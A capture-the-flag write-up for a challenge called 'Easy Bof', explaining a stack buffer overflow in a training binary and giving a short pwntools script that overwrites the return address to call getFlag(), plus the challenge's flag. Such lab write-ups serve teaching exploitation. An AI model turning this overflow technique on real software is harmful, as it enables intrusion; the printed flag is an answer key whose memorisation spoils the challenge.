# Easy Bof

### 📄 Description
This time, you cannot patch the binary and you 
need to exploit a vulnerability in the code.

Additionally, we do not provide the code but you can know that:
```c
char buff[16];
```

Try to use gdb and understand the behavior of the program.

Also here, flag in clear but please report every step in the write-up!

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>

Considering the description, that gives us the dimensions of the buffer, we concur that we must perform a buffer overflow.

We can see that the buffer is 16 char wide and that there's a `getFlag()` function that we might want to execute, so the return address of `main()` must be overwritten with the address of `getFlag()`.

We can use gdb to see the dimensions of the stack in order to undestand how much "padding" to send to write the `getFlag()` address in the correct place, which is 24 bytes.

```python
import pwn

p = pwn.process("./easy_bof")
elf = pwn.ELF("./easy_bof")

p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()
```

<h3> 🚩 Flag </h3>

```plain
spritz{bof_for_fun_and_profit?}
```
</details>